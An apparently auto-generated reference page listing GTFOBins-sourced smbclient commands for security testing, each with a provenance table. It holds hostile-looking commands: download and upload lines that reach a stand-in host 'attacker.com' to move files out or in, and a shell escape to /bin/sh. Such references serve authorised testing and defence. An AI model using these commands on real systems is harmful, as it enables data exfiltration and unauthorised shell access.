---
parsed_by: focuslocust
source: commands
type: generated
---
# smbclient Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## smbclient

Tool page: [smbclient](../../tools/linux/smbclient.md)

### download

```text
smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient` |
| Evidence | Function example preserved from source parser. |

### shell

```text
smbclient '\\host\share'
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient` |
| Evidence | Function example preserved from source parser. |

### upload

```text
smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient` |
| Evidence | Function example preserved from source parser. |
